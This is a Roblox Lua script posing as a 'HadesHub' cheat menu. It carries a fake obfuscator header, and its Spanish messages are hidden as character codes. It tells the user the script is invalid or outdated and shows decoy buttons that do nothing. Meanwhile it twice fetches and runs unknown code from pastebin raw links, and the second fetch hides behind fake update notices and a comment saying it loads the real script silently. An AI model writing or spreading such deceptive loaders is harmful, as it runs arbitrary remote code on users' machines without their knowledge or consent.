-- This file was protected using Luraph Obfuscator v14.4.2 [https://lura.ph/]q
local chr = string.char
local pr = print
local wt = wait
local sp = spawn
local ls = loadstring

pr(chr(73,110,116,101,110,116,97,110,100,111,32,99,97,114,103,97,114,32,115,99,114,105,112,116,46,46,46))

wt(1.5)

game.StarterGui:SetCore(chr(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110), {
    Title = chr(72,97,100,101,115,72,117,98),
    Text = chr(69,115,116,101,32,115,99,114,105,112,116,32,101,115,32,105,110,118,97,108,105,100,111,32,111,32,104,97,32,115,105,100,111,32,101,108,105,109,105,110,97,100,111,46),
    Duration = 6
})

wt(2)

pr(chr(72,97,100,101,115,72,117,98,46))

wt(1.8)

game.StarterGui:SetCore(chr(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110), {
    Title = chr(99,97,114,103,97,110,100,111,46,46,46),
    Text = chr(121,97,32,99,97,115,105,105,105,226,157,164,239,184,143,46,46,46,32,65,100,105,111,115,46),
    Icon = chr(114,98,120,97,115,115,101,116,105,100,58,47,47,54,48,51,49,48,57,52,54,56,54),
    Duration = 10
})

pr(chr(69,108,105,109,105,110,97,110,100,111,32,115,99,114,105,112,116,46,46,46,32,49,48,48,37,32,99,111,109,112,108,101,116,97,100,111,46))

wt(3)

sp(function()
    wt(2)
    ls(game:HttpGet(chr(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,102,52,116,118,66,116,49,83)))()
end)

pr(chr(78,97,100,97,32,113,117,101,32,118,101,114,32,97,113,117,105,44,32,109,117,101,118,101,32,97,108,111,110,103,32,115,107,105,100,46))
pr(chr(83,99,114,105,112,116,32,102,97,108,115,111,32,101,106,101,99,117,116,97,100,111,32,99,111,114,114,101,99,116,97,109,101,110,116,101,46,32,240,159,152,142))
local _c = string.char
local _l = loadstring
local _h = game.HttpGet
local _w = wait
local _s = spawn

local Ray = _l(_h(game, _c(104,116,116,112,115,58,47,47,115,105,114,105,117,115,46,109,101,110,117,47,114,97,121,102,105,101,108,100)))()

local FWin = Ray:CreateWindow({
   Name = _c(72,97,100,101,115,72,117,98),
   LoadingTitle = _c(67,97,114,103,97,110,100,111,32,72,97,100,101,115,72,117,98,46,46,46),
   LoadingSubtitle = _c(98,121,32,68,121,114,111,115),
   ConfigurationSaving = {
      Enabled = false,
      FolderName = _c(72,97,100,101,115,72,117,98),
      FileName = _c(99,111,110,102,105,103)
   },
   Discord = {
      Enabled = false,
      Invite = _c(110,111,105,110,118,105,116,101,108,105,110,107),
      RememberJoins = true
   },
   KeySystem = false
})

local FT = FWin:CreateTab(_c(80,114,105,110,99,105,112,97,108), 4483362458)

FT:CreateLabel(_c(72,97,100,101,115,72,117,98,32,45,32,86,101,114,115,105,195,110,32,65,110,116,105,103,117,97))
FT:CreateLabel(_c(73,110,116,101,110,116,97,110,100,111,32,99,97,114,103,97,114,32,115,99,114,105,112,116,115,46,46,46))

FT:CreateButton({
   Name = _c(67,97,114,103,97,114,32,57,57,32,78,111,99,104,101,115),
   Callback = function()
      Ray:Notify({
         Title = _c(69,114,114,111,114,32,52,48,52),
         Content = _c(83,99,114,105,112,116,32,110,111,32,101,110,99,111,110,116,114,97,100,111,46,32,73,110,116,101,110,116,97,32,109,195,161,115,32,116,97,114,100,101,46),
         Duration = 6
      })
   end
})

FT:CreateButton({
   Name = _c(67,97,114,103,97,114,32,77,117,115,99,108,101,32,76,101,103,101,110,100,115),
   Callback = function()
      Ray:Notify({
         Title = _c(79,117,116,100,97,116,101,100),
         Content = _c(69,115,116,97,32,102,117,110,99,105,195,110,32,121,97,32,110,111,32,101,115,116,195,161,32,100,105,115,112,111,110,105,98,108,101,32,240,159,152,173),
         Duration = 6
      })
   end
})

FT:CreateLabel(_c(78,111,32,104,97,121,32,109,195,161,115,32,102,101,97,116,117,114,101,115,32,97,113,117,105,46,46,46,32,108,111,32,115,105,101,110,116,111,32,115,107,105,100,32,240,159,152,130))

-- Junk pa' trollear
local junk = math.random(1,1000) if junk == 666 then junk = 1 end

_s(function()
    _w(10)

    Ray:Notify({
        Title = _c(69,114,114,111,114,32,67,114,195,173,116,105,99,111),
        Content = _c(86,101,114,115,105,195,110,32,111,98,115,111,108,101,116,97,32,100,101,116,101,99,116,97,100,97,46,10,65,99,116,117,97,108,105,122,97,110,100,111,32,97,117,116,111,109,195,161,116,105,99,97,109,101,110,116,101,46,46,46),
        Duration = 8
    })

    _w(5)

    Ray:Notify({
        Title = _c(65,99,116,117,97,108,105,122,97,99,105,195,110,32,67,111,109,112,108,101,116,97),
        Content = _c(67,97,114,103,97,110,100,111,32,110,117,101,118,97,32,118,101,114,115,105,195,110,46,46,46),
        Duration = 5
    })

    _w(3)

    -- Carga la verdadera en silencio
    _l(_h(game, _c(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,118,82,103,66,87,107,54,99)))()
end)
